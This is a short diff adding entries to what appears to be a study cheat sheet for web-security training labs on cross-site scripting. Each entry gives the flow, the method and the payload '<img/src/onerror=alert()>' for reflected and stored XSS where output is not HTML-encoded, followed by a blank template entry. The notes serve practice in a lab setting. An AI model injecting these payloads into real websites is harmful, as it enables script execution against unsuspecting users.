@@ -1,5 +1,17 @@
+------> Lab: Reflected XSS into HTML context with nothing encoded
+	Flow: Output no HTML-encoded
+	Method: just insert any scriptable tag
+	Payload: <img/src/onerror=alert()>
 
+------> Lab: Stored XSS into HTML context with nothing encoded
+	Flow: Output no HTML-encoded
+	Method: just insert any scriptable tag
+	Payload: <img/src/onerror=alert()>
 
+------> 
+	Flow:
+	Method:
+	Payload:
 
 
 ------> Lab: Reflected XSS with some SVG markup allowed
